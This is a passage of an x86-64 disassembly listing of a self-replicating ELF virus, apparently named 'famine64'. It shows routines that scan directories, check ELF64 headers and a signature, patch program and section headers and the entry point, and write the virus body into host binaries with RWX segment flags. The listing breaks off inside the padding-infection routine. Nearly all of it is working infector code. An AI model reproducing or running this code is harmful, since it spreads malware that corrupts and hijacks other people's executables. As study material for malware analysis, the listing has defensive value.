    104e:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1056:	movsxd rcx,ecx
    1059:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    105e:	lea    ecx,[rdx+0x9]
    1061:	cmp    eax,ecx
    1063:	jle    1114 <get_dat_elf+0x3b4>
    1069:	movsxd rsi,ecx
    106c:	add    ecx,r15d
    106f:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1077:	movsxd rcx,ecx
    107a:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    107f:	lea    ecx,[rdx+0xa]
    1082:	cmp    eax,ecx
    1084:	jle    1114 <get_dat_elf+0x3b4>
    108a:	movsxd rsi,ecx
    108d:	add    ecx,r15d
    1090:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    1098:	movsxd rcx,ecx
    109b:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10a0:	lea    ecx,[rdx+0xb]
    10a3:	cmp    eax,ecx
    10a5:	jle    1114 <get_dat_elf+0x3b4>
    10a7:	movsxd rsi,ecx
    10aa:	add    ecx,r15d
    10ad:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10b5:	movsxd rcx,ecx
    10b8:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10bd:	lea    ecx,[rdx+0xc]
    10c0:	cmp    eax,ecx
    10c2:	jle    1114 <get_dat_elf+0x3b4>
    10c4:	movsxd rsi,ecx
    10c7:	add    ecx,r15d
    10ca:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10d2:	movsxd rcx,ecx
    10d5:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10da:	lea    ecx,[rdx+0xd]
    10dd:	cmp    eax,ecx
    10df:	jle    1114 <get_dat_elf+0x3b4>
    10e1:	movsxd rsi,ecx
    10e4:	add    edx,0xe
    10e7:	add    ecx,r15d
    10ea:	movzx  esi,BYTE PTR [rsp+rsi*1+0x420]
    10f2:	movsxd rcx,ecx
    10f5:	cmp    eax,edx
    10f7:	mov    BYTE PTR [r13+rcx*1+0x0],sil
    10fc:	jle    1114 <get_dat_elf+0x3b4>
    10fe:	movsxd rcx,edx
    1101:	add    edx,r15d
    1104:	movzx  ecx,BYTE PTR [rsp+rcx*1+0x420]
    110c:	movsxd rdx,edx
    110f:	mov    BYTE PTR [r13+rdx*1+0x0],cl
    1114:	add    r15d,eax
    1117:	jmp    ec0 <get_dat_elf+0x160>
    111c:	mov    esi,ebp
    111e:	mov    edi,0x3
    1123:	xor    eax,eax
    1125:	call   670 <syscall@plt>
    112a:	add    rsp,0x828
    1131:	pop    rbx
    1132:	pop    rbp
    1133:	pop    r12
    1135:	pop    r13
    1137:	pop    r14
    1139:	pop    r15
    113b:	ret    
    113c:	lea    edx,[rax-0x1]
    113f:	lea    r10,[rbp+rdx*1+0x1]
    1144:	mov    rdx,rbp
    1147:	nop    WORD PTR [rax+rax*1+0x0]
    1150:	movzx  esi,BYTE PTR [rdx]
    1153:	lea    rcx,[r14+rdx*1]
    1157:	add    rdx,0x1
    115b:	cmp    rdx,r10
    115e:	mov    BYTE PTR [rcx+rdi*1],sil
    1162:	jne    1150 <get_dat_elf+0x3f0>
    1164:	jmp    1114 <get_dat_elf+0x3b4>
    1166:	mov    rbp,QWORD PTR [rsp+0x18]
    116b:	mov    DWORD PTR [rsp],eax
    116e:	mov    edi,0x3
    1173:	xor    eax,eax
    1175:	mov    r14,r13
    1178:	mov    esi,ebp
    117a:	call   670 <syscall@plt>
    117f:	mov    edx,DWORD PTR [rsp]
    1182:	test   edx,edx
    1184:	jne    119e <get_dat_elf+0x43e>
    1186:	cmp    DWORD PTR [rsp+0x10],0x3f
    118b:	jle    119e <get_dat_elf+0x43e>
    118d:	cmp    DWORD PTR [r13+0x0],0x464c457f
    1195:	jne    119e <get_dat_elf+0x43e>
    1197:	cmp    BYTE PTR [r13+0x4],0x2
    119c:	je     11c6 <get_dat_elf+0x466>
    119e:	mov    edx,DWORD PTR [rsp+0x10]
    11a2:	mov    rsi,r14
    11a5:	mov    edi,0xb
    11aa:	xor    eax,eax
    11ac:	call   670 <syscall@plt>
    11b1:	jmp    112a <get_dat_elf+0x3ca>
    11b6:	mov    esi,ebp
    11b8:	mov    edi,0x3
    11bd:	xor    eax,eax
    11bf:	call   670 <syscall@plt>
    11c4:	jmp    119e <get_dat_elf+0x43e>
    11c6:	cmp    BYTE PTR [r13+0x5],0x0
    11cb:	je     119e <get_dat_elf+0x43e>
    11cd:	cmp    BYTE PTR [r13+0x6],0x1
    11d2:	jne    119e <get_dat_elf+0x43e>
    11d4:	movzx  eax,WORD PTR [r13+0x10]
    11d9:	sub    eax,0x2
    11dc:	cmp    ax,0x1
    11e0:	ja     119e <get_dat_elf+0x43e>
    11e2:	cmp    WORD PTR [r13+0x12],0x3e
    11e8:	jne    119e <get_dat_elf+0x43e>
    11ea:	cmp    QWORD PTR [r13+0x20],0x40
    11ef:	jne    119e <get_dat_elf+0x43e>
    11f1:	movzx  edx,WORD PTR [r13+0x38]
    11f6:	movsxd rcx,DWORD PTR [rsp+0x10]
    11fb:	lea    rax,[rdx*8+0x0]
    1203:	sub    rax,rdx
    1206:	lea    rax,[rax*8+0x40]
    120e:	cmp    rcx,rax
    1211:	jb     119e <get_dat_elf+0x43e>
    1213:	mov    rsi,QWORD PTR [r13+0x28]
    1217:	cmp    rsi,0x3f
    121b:	jbe    119e <get_dat_elf+0x43e>
    121d:	movzx  eax,WORD PTR [r13+0x3c]
    1222:	mov    rdx,rax
    1225:	shl    rax,0x6
    1229:	add    rax,rsi
    122c:	cmp    rcx,rax
    122f:	jb     119e <get_dat_elf+0x43e>
    1235:	cmp    DWORD PTR [r13+0x34],0x380040
    123d:	jne    119e <get_dat_elf+0x43e>
    1243:	cmp    WORD PTR [r13+0x3a],0x40
    1249:	jne    119e <get_dat_elf+0x43e>
    124f:	movzx  eax,WORD PTR [r13+0x3e]
    1254:	cmp    dx,ax
    1257:	jbe    119e <get_dat_elf+0x43e>
    125d:	test   ax,ax
    1260:	je     119e <get_dat_elf+0x43e>
    1266:	mov    esi,DWORD PTR [rsp+0x10]
    126a:	mov    rdi,QWORD PTR [rsp+0x8]
    126f:	mov    rdx,r13
    1272:	call   8c0 <pack_dat_elf>
    1277:	jmp    119e <get_dat_elf+0x43e>
    127c:	lea    rax,[rsp+0x20]
    1281:	mov    QWORD PTR [rsp+0x8],rax
    1286:	mov    rsi,rax
    1289:	jmp    de4 <get_dat_elf+0x84>
    128e:	xor    ecx,ecx
    1290:	jmp    da3 <get_dat_elf+0x43>
    1295:	nop
    1296:	nop    WORD PTR cs:[rax+rax*1+0x0]

00000000000012a0 <find_files>:
    12a0:	push   r15
    12a2:	push   r14
    12a4:	xor    ecx,ecx
    12a6:	push   r13
    12a8:	push   r12
    12aa:	mov    rsi,rdi
    12ad:	push   rbp
    12ae:	push   rbx
    12af:	xor    eax,eax
    12b1:	mov    r12,rdi
    12b4:	mov    edx,0x90800
    12b9:	mov    edi,0x2
    12be:	sub    rsp,0x418
    12c5:	call   670 <syscall@plt>
    12ca:	cmp    eax,0xffffffff
    12cd:	mov    QWORD PTR [rsp+0x8],rax
    12d2:	je     133d <find_files+0x9d>
    12d4:	lea    r15,[rsp+0x10]
    12d9:	mov    r13d,eax
    12dc:	nop    DWORD PTR [rax+0x0]
    12e0:	xor    eax,eax
    12e2:	mov    ecx,0x400
    12e7:	mov    rdx,r15
    12ea:	mov    esi,r13d
    12ed:	mov    edi,0xd9
    12f2:	call   670 <syscall@plt>
    12f7:	test   eax,eax
    12f9:	mov    r14d,eax
    12fc:	jle    132d <find_files+0x8d>
    12fe:	xor    ebp,ebp
    1300:	jmp    1313 <find_files+0x73>
    1302:	nop    WORD PTR [rax+rax*1+0x0]
    1308:	movzx  eax,WORD PTR [rbx+0x10]
    130c:	add    ebp,eax
    130e:	cmp    r14d,ebp
    1311:	jle    12e0 <find_files+0x40>
    1313:	movsxd rbx,ebp
    1316:	add    rbx,r15
    1319:	cmp    BYTE PTR [rbx+0x12],0x8
    131d:	jne    1308 <find_files+0x68>
    131f:	lea    rsi,[rbx+0x13]
    1323:	mov    rdi,r12
    1326:	call   d60 <get_dat_elf>
    132b:	jmp    1308 <find_files+0x68>
    132d:	mov    esi,DWORD PTR [rsp+0x8]
    1331:	mov    edi,0x3
    1336:	xor    eax,eax
    1338:	call   670 <syscall@plt>
    133d:	add    rsp,0x418
    1344:	pop    rbx
    1345:	pop    rbp
    1346:	pop    r12
    1348:	pop    r13
    134a:	pop    r14
    134c:	pop    r15
    134e:	ret    
    134f:	nop

0000000000001350 <famine64_signature>:
    1350:	$..$B..B

0000000000001358 <famine64_func>:
    1358:	push   rax
    1359:	push   rdi
    135a:	sub    rsp,0x10
    135e:	mov    QWORD PTR [rsp],0x0

0000000000001366 <dir_loop>:
    1366:	mov    rax,QWORD PTR [rsp]
    136a:	lea    rdi,[rip+0x7f6]        # 1b67 <dir_all>
    1371:	mov    rdi,QWORD PTR [rdi+rax*8]
    1375:	cmp    rdi,0x0
    1379:	je     1aec <famine64_end>
    137f:	call   138b <find_files>
    1384:	add    QWORD PTR [rsp],0x1
    1389:	jmp    1366 <dir_loop>

000000000000138b <find_files>:
    138b:	push   rax
    138c:	push   rbx
    138d:	push   rdx
    138e:	push   rdi
    138f:	push   rsi
    1390:	sub    rsp,0x410
    1397:	xor    eax,eax
    1399:	mov    QWORD PTR [rsp],rdi
    139d:	mov    edx,0x0
    13a2:	mov    esi,0x90800
    13a7:	mov    rdi,QWORD PTR [rsp]
    13ab:	mov    eax,0x2
    13b0:	syscall 
    13b2:	mov    DWORD PTR [rsp+0x8],eax
    13b6:	cmp    DWORD PTR [rsp+0x8],0x0
    13bb:	jl     1413 <find_files_end>

00000000000013bd <loop_file>:
    13bd:	xor    eax,eax
    13bf:	mov    edi,DWORD PTR [rsp+0x8]
    13c3:	lea    rsi,[rsp+0x10]
    13c8:	mov    edx,0x400
    13cd:	mov    eax,0xd9
    13d2:	syscall 
    13d4:	test   eax,eax
    13d6:	jle    1408 <loop_end>
    13d8:	mov    DWORD PTR [rsp+0xc],eax
    13dc:	xor    rax,rax
    13df:	xor    rbx,rbx
    13e2:	jmp    13f1 <check_file_type>

00000000000013e4 <next_file>:
    13e4:	movsx  eax,WORD PTR [rsp+rbx*1+0x20]
    13e9:	add    ebx,eax
    13eb:	cmp    DWORD PTR [rsp+0xc],ebx
    13ef:	jle    13bd <loop_file>

00000000000013f1 <check_file_type>:
    13f1:	cmp    BYTE PTR [rsp+rbx*1+0x22],0x8
    13f6:	jne    13e4 <next_file>
    13f8:	mov    rdi,QWORD PTR [rsp]
    13fc:	lea    rsi,[rsp+rbx*1+0x23]
    1401:	call   1420 <get_dat_elf>
    1406:	jmp    13e4 <next_file>

0000000000001408 <loop_end>:
    1408:	mov    edi,DWORD PTR [rsp+0x8]
    140c:	mov    eax,0x3
    1411:	syscall 

0000000000001413 <find_files_end>:
    1413:	add    rsp,0x410
    141a:	pop    rsi
    141b:	pop    rdi
    141c:	pop    rdx
    141d:	pop    rbx
    141e:	pop    rax
    141f:	ret    

0000000000001420 <get_dat_elf>:
    1420:	push   rbp
    1421:	push   rbx
    1422:	sub    rsp,0x400
    1429:	xor    ecx,ecx
    142b:	movzx  edx,BYTE PTR [rdi]
    142e:	test   dl,dl
    1430:	je     1440 <copy_file>

0000000000001432 <copy_dir_bytes>:
    1432:	mov    BYTE PTR [rsp+rcx*1],dl
    1435:	inc    rcx
    1438:	movzx  edx,BYTE PTR [rdi+rcx*1]
    143c:	test   dl,dl
    143e:	jne    1432 <copy_dir_bytes>

0000000000001440 <copy_file>:
    1440:	add    rsp,rcx
    1443:	xor    eax,eax
    1445:	movzx  edx,BYTE PTR [rsi]
    1448:	test   dl,dl
    144a:	je     145a <open_file>

000000000000144c <copy_file_bytes>:
    144c:	mov    BYTE PTR [rsp+rax*1],dl
    144f:	inc    rax
    1452:	movzx  edx,BYTE PTR [rsi+rax*1]
    1456:	test   dl,dl
    1458:	jne    144c <copy_file_bytes>

000000000000145a <open_file>:
    145a:	mov    BYTE PTR [rsp+rax*1],0x0
    145e:	sub    rsp,rcx
    1461:	sub    rsp,0x10
    1465:	mov    DWORD PTR [rsp],0xffffffff
    146c:	mov    QWORD PTR [rsp+0x4],0xffffffffffffffff
    1475:	mov    QWORD PTR [rsp+0x8],0xffffffffffffffff
    147e:	mov    edx,0x0
    1483:	mov    esi,0x800
    1488:	lea    rdi,[rsp+0x10]
    148d:	mov    eax,0x2
    1492:	syscall 
    1494:	mov    DWORD PTR [rsp],eax
    1497:	cmp    rax,0x0
    149b:	jl     15f6 <get_dat_elf_end>
    14a1:	mov    edx,0x2
    14a6:	mov    esi,0x1
    14ab:	mov    edi,eax
    14ad:	mov    eax,0x8
    14b2:	syscall 
    14b4:	mov    DWORD PTR [rsp+0x4],eax
    14b8:	cmp    rax,0x0
    14bc:	jle    15d4 <close_file>
    14c2:	mov    eax,DWORD PTR [rsp+0x4]
    14c6:	mov    r9d,0x0
    14cc:	mov    r8d,0xffffffff
    14d2:	mov    r10d,0x22
    14d8:	mov    edx,0x3
    14dd:	mov    rsi,rax
    14e0:	mov    edi,0x0
    14e5:	mov    eax,0x9
    14ea:	syscall 
    14ec:	mov    QWORD PTR [rsp+0x8],rax
    14f1:	cmp    rax,0xffffffffffffffff
    14f5:	jle    15d4 <close_file>
    14fb:	mov    edx,0x0
    1500:	mov    esi,0x0
    1505:	mov    edi,DWORD PTR [rsp]
    1508:	mov    eax,0x8
    150d:	syscall 
    150f:	cmp    rax,0x0
    1513:	jl     15d4 <close_file>
    1519:	sub    rsp,0x410
    1520:	mov    DWORD PTR [rsp],0x0
    1527:	mov    DWORD PTR [rsp+0x4],0x0

000000000000152f <read_loop>:
    152f:	mov    eax,DWORD PTR [rsp+0x4]
    1533:	add    DWORD PTR [rsp],eax
    1536:	mov    edx,0x400
    153b:	lea    rsi,[rsp+0x8]
    1540:	mov    edi,DWORD PTR [rsp+0x410]
    1547:	mov    eax,0x0
    154c:	syscall 
    154e:	mov    DWORD PTR [rsp+0x408],eax
    1555:	cmp    DWORD PTR [rsp+0x408],0x0
    155d:	jle    1595 <read_loop_end>
    155f:	mov    DWORD PTR [rsp+0x4],0x0

0000000000001567 <read_loop_copy>:
    1567:	mov    eax,DWORD PTR [rsp+0x4]
    156b:	cmp    eax,DWORD PTR [rsp+0x408]
    1572:	jge    152f <read_loop>
    1574:	mov    eax,DWORD PTR [rsp+0x4]
    1578:	movzx  eax,BYTE PTR [rsp+rax*1+0x8]
    157d:	mov    edx,DWORD PTR [rsp]
    1580:	add    edx,DWORD PTR [rsp+0x4]
    1584:	add    rdx,QWORD PTR [rsp+0x418]
    158c:	mov    BYTE PTR [rdx],al
    158e:	add    DWORD PTR [rsp+0x4],0x1
    1593:	jmp    1567 <read_loop_copy>

0000000000001595 <read_loop_end>:
    1595:	add    rsp,0x410
    159c:	mov    edi,DWORD PTR [rsp]
    159f:	mov    eax,0x3
    15a4:	syscall 
    15a6:	cmp    DWORD PTR [rsp-0x8],0x0
    15ab:	jne    15de <munmap_file>
    15ad:	mov    rsi,QWORD PTR [rsp+0x8]
    15b2:	mov    edi,DWORD PTR [rsp+0x4]
    15b6:	call   1600 <check_file>
    15bb:	cmp    rax,0x1
    15bf:	jne    15de <munmap_file>
    15c1:	mov    rdx,QWORD PTR [rsp+0x8]
    15c6:	mov    esi,DWORD PTR [rsp+0x4]
    15ca:	lea    rdi,[rsp+0x10]
    15cf:	call   1689 <infect_file>

00000000000015d4 <close_file>:
    15d4:	mov    edi,DWORD PTR [rsp]
    15d7:	mov    eax,0x3
    15dc:	syscall 

00000000000015de <munmap_file>:
    15de:	cmp    QWORD PTR [rsp+0x10],0xffffffffffffffff
    15e4:	je     15f6 <get_dat_elf_end>
    15e6:	mov    esi,DWORD PTR [rsp+0x4]
    15ea:	mov    rdi,QWORD PTR [rsp+0x8]
    15ef:	mov    eax,0xb
    15f4:	syscall 

00000000000015f6 <get_dat_elf_end>:
    15f6:	add    rsp,0x410
    15fd:	pop    rbx
    15fe:	pop    rbp
    15ff:	ret    

0000000000001600 <check_file>:
    1600:	xor    rax,rax
    1603:	cmp    rdi,0x3f
    1607:	jl     1688 <check_end>
    1609:	cmp    DWORD PTR [rsi],0x464c457f
    160f:	jne    1688 <check_end>
    1611:	cmp    BYTE PTR [rsi+0x4],0x2
    1615:	jne    1688 <check_end>
    1617:	cmp    BYTE PTR [rsi+0x5],0x0
    161b:	je     1688 <check_end>
    161d:	cmp    BYTE PTR [rsi+0x6],0x1
    1621:	jne    1688 <check_end>
    1623:	movzx  edx,WORD PTR [rsi+0x10]
    1627:	sub    edx,0x2
    162a:	cmp    dl,0x1
    162d:	ja     1688 <check_end>
    162f:	cmp    WORD PTR [rsi+0x12],0x3e
    1634:	jne    1688 <check_end>
    1636:	cmp    QWORD PTR [rsi+0x20],0x40
    163b:	jne    1688 <check_end>
    163d:	movzx  edx,WORD PTR [rsi+0x38]
    1641:	imul   edx,edx,0x38
    1644:	add    rdx,QWORD PTR [rsi+0x20]
    1648:	cmp    rdx,rdi
    164b:	ja     1688 <check_end>
    164d:	cmp    QWORD PTR [rsi+0x28],0x40
    1652:	jl     1688 <check_end>
    1654:	movzx  edx,WORD PTR [rsi+0x3c]
    1658:	imul   edx,edx,0x40
    165b:	add    rdx,QWORD PTR [rsi+0x28]
    165f:	cmp    rdx,rdi
    1662:	ja     1688 <check_end>
    1664:	cmp    WORD PTR [rsi+0x34],0x40
    1669:	jne    1688 <check_end>
    166b:	cmp    WORD PTR [rsi+0x36],0x38
    1670:	jne    1688 <check_end>
    1672:	cmp    WORD PTR [rsi+0x3a],0x40
    1677:	jne    1688 <check_end>
    1679:	movzx  edx,WORD PTR [rsi+0x3c]
    167d:	cmp    WORD PTR [rsi+0x3e],dx
    1681:	jae    1688 <check_end>
    1683:	mov    eax,0x1

0000000000001688 <check_end>:
    1688:	ret    

0000000000001689 <infect_file>:
    1689:	push   rbp
    168a:	push   rbx
    168b:	sub    rsp,0x40
    168f:	mov    rax,rdx
    1692:	add    rax,QWORD PTR [rdx+0x20]
    1696:	mov    QWORD PTR [rsp],rax
    169a:	mov    QWORD PTR [rsp+0x8],0x0
    16a3:	mov    rax,rdx
    16a6:	add    rax,QWORD PTR [rdx+0x28]
    16aa:	mov    QWORD PTR [rsp+0x10],rax
    16af:	mov    QWORD PTR [rsp+0x18],0x0
    16b8:	movzx  eax,WORD PTR [rdx+0x3e]
    16bc:	imul   ax,WORD PTR [rdx+0x3a]
    16c1:	add    rax,QWORD PTR [rsp+0x10]
    16c6:	mov    rax,QWORD PTR [rax+0x18]
    16ca:	add    rax,rdx
    16cd:	mov    ebx,0x0

00000000000016d2 <find_text_section>:
    16d2:	cmp    bx,WORD PTR [rdx+0x3c]
    16d6:	jae    175d <find_text_end>
    16dc:	xor    rcx,rcx
    16df:	mov    cx,WORD PTR [rdx+0x3a]
    16e3:	imul   ecx,ebx
    16e6:	add    rcx,QWORD PTR [rsp+0x10]
    16eb:	mov    ecx,DWORD PTR [rcx]
    16ed:	add    rcx,rax
    16f0:	cmp    DWORD PTR [rcx],0x7865742e
    16f6:	je     16fe <find_text_section_name>
    16f8:	add    rbx,0x1
    16fc:	jmp    16d2 <find_text_section>

00000000000016fe <find_text_section_name>:
    16fe:	cmp    WORD PTR [rcx+0x4],0x74
    1703:	je     170b <find_text_next>
    1705:	add    rbx,0x1
    1709:	jmp    16d2 <find_text_section>

000000000000170b <find_text_next>:
    170b:	imul   bx,WORD PTR [rdx+0x3a]
    1710:	add    rbx,QWORD PTR [rsp+0x10]
    1715:	mov    QWORD PTR [rsp+0x18],rbx
    171a:	mov    ebx,0x0

000000000000171f <find_text_segment>:
    171f:	cmp    bx,WORD PTR [rdx+0x38]
    1723:	jae    175d <find_text_end>
    1725:	xor    rcx,rcx
    1728:	mov    cx,WORD PTR [rdx+0x36]
    172c:	imul   ecx,ebx
    172f:	add    rcx,QWORD PTR [rsp]
    1733:	add    rbx,0x1
    1737:	cmp    DWORD PTR [rcx],0x1
    173a:	jne    171f <find_text_segment>
    173c:	mov    r8,QWORD PTR [rsp+0x18]
    1741:	mov    r8,QWORD PTR [r8+0x18]
    1745:	cmp    r8,QWORD PTR [rcx+0x10]
    1749:	jl     171f <find_text_segment>
    174b:	mov    r9,QWORD PTR [rcx+0x10]
    174f:	add    r9,QWORD PTR [rcx+0x20]
    1753:	cmp    r8,r9
    1756:	jae    171f <find_text_segment>
    1758:	mov    QWORD PTR [rsp+0x8],rcx

000000000000175d <find_text_end>:
    175d:	mov    ebx,0x0
    1762:	cmp    QWORD PTR [rsp+0x8],0x0
    1768:	je     1774 <find_entry_section>
    176a:	cmp    QWORD PTR [rsp+0x18],0x0
    1770:	je     1774 <find_entry_section>
    1772:	jmp    17f1 <check_signature>

0000000000001774 <find_entry_section>:
    1774:	cmp    bx,WORD PTR [rdx+0x3c]
    1778:	jae    17e1 <find_entry_end>
    177a:	xor    rcx,rcx
    177d:	mov    cx,WORD PTR [rdx+0x3a]
    1781:	imul   ecx,ebx
    1784:	add    rcx,QWORD PTR [rsp+0x10]
    1789:	mov    r8,QWORD PTR [rcx+0x18]
    178d:	add    rbx,0x1
    1791:	cmp    QWORD PTR [rdx+0x18],r8
    1795:	jl     1774 <find_entry_section>
    1797:	add    r8,QWORD PTR [rcx+0x20]
    179b:	cmp    QWORD PTR [rdx+0x18],r8
    179f:	jae    1774 <find_entry_section>
    17a1:	mov    QWORD PTR [rsp+0x18],rcx
    17a6:	mov    ebx,0x0

00000000000017ab <find_entry_segment>:
    17ab:	cmp    bx,WORD PTR [rdx+0x38]
    17af:	jae    17e1 <find_entry_end>
    17b1:	xor    rcx,rcx
    17b4:	mov    cx,WORD PTR [rdx+0x36]
    17b8:	imul   ecx,ebx
    17bb:	add    rcx,QWORD PTR [rsp]
    17bf:	add    rbx,0x1
    17c3:	cmp    DWORD PTR [rcx],0x1
    17c6:	jne    17ab <find_entry_segment>
    17c8:	mov    r8,QWORD PTR [rcx+0x10]
    17cc:	cmp    QWORD PTR [rdx+0x18],r8
    17d0:	jl     17ab <find_entry_segment>
    17d2:	add    r8,QWORD PTR [rcx+0x20]
    17d6:	cmp    QWORD PTR [rdx+0x18],r8
    17da:	jae    17ab <find_entry_segment>
    17dc:	mov    QWORD PTR [rsp+0x8],rcx

00000000000017e1 <find_entry_end>:
    17e1:	cmp    QWORD PTR [rsp+0x8],0x0
    17e7:	je     1828 <infect_end>
    17e9:	cmp    QWORD PTR [rsp+0x18],0x0
    17ef:	je     1828 <infect_end>

00000000000017f1 <check_signature>:
    17f1:	mov    rax,rdx
    17f4:	add    rax,QWORD PTR [rax+0x18]
    17f8:	sub    rax,0x8
    17fc:	mov    rax,QWORD PTR [rax]
    17ff:	cmp    rax,QWORD PTR [rip+0xfffffffffffffb4a]        # 1350 <famine64_signature>
    1806:	je     1828 <infect_end>
    1808:	mov    QWORD PTR [rsp+0x28],rdi
    180d:	mov    QWORD PTR [rsp+0x30],rsi
    1812:	mov    QWORD PTR [rsp+0x38],rdx

0000000000001817 <reopen_file>:
    1817:	mov    esi,0x281
    181c:	mov    eax,0x2
    1821:	syscall 
    1823:	cmp    eax,0x0
    1826:	jl     1828 <infect_end>

0000000000001828 <infect_end>:
    1828:	add    rsp,0x40
    182c:	pop    rbx
    182d:	pop    rsp
    182e:	ret    
    182f:	sub    rsp,0xbc
    1836:	mov    DWORD PTR [rsp],0x0
    183d:	mov    QWORD PTR [rsp+0x4],rdx
    1842:	mov    QWORD PTR [rsp+0xc],rsi
    1847:	mov    QWORD PTR [rsp+0x14],0x0
    1850:	mov    QWORD PTR [rsp+0x1c],0x0
    1859:	mov    QWORD PTR [rsp+0x24],r8
    185e:	mov    QWORD PTR [rsp+0x2c],rdi
    1863:	mov    QWORD PTR [rsp+0x34],0x0
    186c:	mov    esi,0x41
    1871:	mov    rdx,QWORD PTR [rsp+0x4c]
    1876:	mov    eax,0x2
    187b:	syscall 
    187d:	cmp    eax,0x0
    1880:	jl     1ada <infect_file_end_add>
    1886:	mov    DWORD PTR [rsp],eax
    1889:	mov    r8,QWORD PTR [rsp+0x24]
    188e:	mov    r9,QWORD PTR [r8+0x8]
    1892:	add    r9,QWORD PTR [r8+0x20]
    1896:	mov    QWORD PTR [rsp+0x1c],r9
    189b:	mov    r8,QWORD PTR [rsp+0x24]
    18a0:	mov    r9,QWORD PTR [r8+0x10]
    18a4:	add    r9,QWORD PTR [r8+0x20]
    18a8:	mov    r8,QWORD PTR [rsp+0x4]
    18ad:	sub    r9,QWORD PTR [r8+0x18]
    18b1:	imul   r9,r9,0xffffffffffffffff
    18b5:	mov    QWORD PTR [rsp+0x14],r9
    18ba:	mov    r8,QWORD PTR [rsp+0x4]
    18bf:	mov    r9,QWORD PTR [rsp+0x24]
    18c4:	mov    r9,QWORD PTR [r9+0x10]
    18c8:	add    r9,QWORD PTR [rsp+0x1c]
    18cd:	mov    QWORD PTR [r8+0x18],r9
    18d1:	mov    r8,QWORD PTR [rsp+0x24]
    18d6:	mov    r9,QWORD PTR [rsp+0x4]
    18db:	xor    r10,r10
    18de:	mov    r10w,WORD PTR [r9+0x36]
    18e3:	add    r10,r8
    18e6:	mov    r9,QWORD PTR [r10+0x8]
    18ea:	sub    r9,QWORD PTR [r8+0x8]
    18ee:	sub    r9,QWORD PTR [r8+0x28]
    18f2:	cmp    r9d,DWORD PTR [rip+0x223]        # 1b1c <famine64_size>
    18f9:	jg     1a24 <infect_file_in_padding>
    18ff:	xor    rax,rax

0000000000001902 <compute_padding>:
    1902:	add    eax,0x1000
    1907:	cmp    eax,DWORD PTR [rip+0x20f]        # 1b1c <famine64_size>
    190d:	jl     1902 <compute_padding>
    190f:	mov    rdx,QWORD PTR [rsp+0x4]
    1914:	mov    r8,QWORD PTR [rdx+0x20]
    1918:	lea    r8,[rdx+r8*1]
    191c:	xor    rcx,rcx
    191f:	movzx  ecx,WORD PTR [rdx+0x38]
    1923:	xor    r9,r9
    1926:	movzx  r9d,WORD PTR [rdx+0x36]
    192b:	imul   rcx,r9
    192f:	add    rcx,r8
    1932:	mov    r9,QWORD PTR [rsp+0x24]
    1937:	mov    r10,QWORD PTR [r9+0x8]
    193b:	add    r10,QWORD PTR [r9+0x20]

000000000000193f <next_segment2>:
    193f:	add    r8w,WORD PTR [rdx+0x36]
    1944:	cmp    rcx,r8
    1947:	jle    1955 <modify_sections>
    1949:	cmp    QWORD PTR [r8+0x8],r10
    194d:	jl     193f <next_segment2>
    194f:	add    QWORD PTR [r8+0x8],rax
    1953:	jmp    193f <next_segment2>

0000000000001955 <modify_sections>:
    1955:	mov    r8,QWORD PTR [rdx+0x28]
    1959:	lea    r8,[rdx+r8*1]
    195d:	xor    rcx,rcx
    1960:	movzx  ecx,WORD PTR [rdx+0x3c]
    1964:	xor    r9,r9
    1967:	movzx  r9d,WORD PTR [rdx+0x3a]
    196c:	imul   rcx,r9
    1970:	add    rcx,r8

0000000000001973 <next_section2>:
    1973:	add    r8w,WORD PTR [rdx+0x3a]
    1978:	cmp    rcx,r8
    197b:	jle    1989 <modify_shoff>
    197d:	cmp    QWORD PTR [r8+0x18],r10
    1981:	jl     1973 <next_section2>
    1983:	add    QWORD PTR [r8+0x18],rax
    1987:	jmp    1973 <next_section2>

0000000000001989 <modify_shoff>:
    1989:	mov    rcx,QWORD PTR [rsp+0x4]
    198e:	add    QWORD PTR [rcx+0x28],rax

0000000000001992 <infect_file_add_padding>:
    1992:	mov    r8,QWORD PTR [rsp+0x24]
    1997:	add    QWORD PTR [r8+0x20],rax
    199b:	add    QWORD PTR [r8+0x28],rax
    199f:	xor    r9,r9
    19a2:	or     r9,0x1
    19a6:	or     r9,0x2
    19aa:	or     r9,0x4
    19ae:	mov    DWORD PTR [r8+0x4],r9d
    19b2:	mov    QWORD PTR [rsp+0x2c],rax
    19b7:	mov    eax,0x1
    19bc:	mov    edi,DWORD PTR [rsp]
    19bf:	mov    rsi,QWORD PTR [rsp+0x4]
    19c4:	mov    rdx,QWORD PTR [rsp+0x1c]
    19c9:	syscall 
    19cb:	mov    eax,0x1
    19d0:	mov    edi,DWORD PTR [rsp]
    19d3:	lea    rsi,[rip+0xfffffffffffff97e]        # 1358 <famine64_func>
    19da:	mov    edx,DWORD PTR [rip+0x13c]        # 1b1c <famine64_size>
    19e0:	sub    edx,0x8
    19e3:	syscall 
    19e5:	mov    eax,0x1
    19ea:	mov    edi,DWORD PTR [rsp]
    19ed:	lea    rsi,[rsp+0x14]
    19f2:	mov    edx,0x8
    19f7:	syscall 

00000000000019f9 <write_zeros>:
    19f9:	mov    eax,0x1
    19fe:	mov    edi,DWORD PTR [rsp]
    1a01:	lea    rsi,[rip+0x113]        # 1b1b <data>
    1a08:	mov    edx,0x1
    1a0d:	syscall 
    1a0f:	sub    QWORD PTR [rsp+0x2c],0x1
    1a15:	mov    rax,QWORD PTR [rsp+0x2c]
    1a1a:	cmp    eax,DWORD PTR [rip+0xfc]        # 1b1c <famine64_size>
    1a20:	jg     19f9 <write_zeros>
    1a22:	jmp    1a99 <write_end>

0000000000001a24 <infect_file_in_padding>:
    1a24:	xor    r9,r9
    1a27:	mov    r9d,DWORD PTR [rip+0xee]        # 1b1c <famine64_size>
    1a2e:	add    QWORD PTR [r8+0x20],r9
    1a32:	add    QWORD PTR [r8+0x28],r9
    1a36:	xor    r9,r9
    1a39:	or     r9,0x1
    1a3d:	or     r9,0x2
    1a41:	or     r9,0x4
    1a45:	mov    DWORD PTR [r8+0x4],r9d
    1a49:	mov    eax,0x1
    1a4e:	mov    edi,DWORD PTR [rsp]
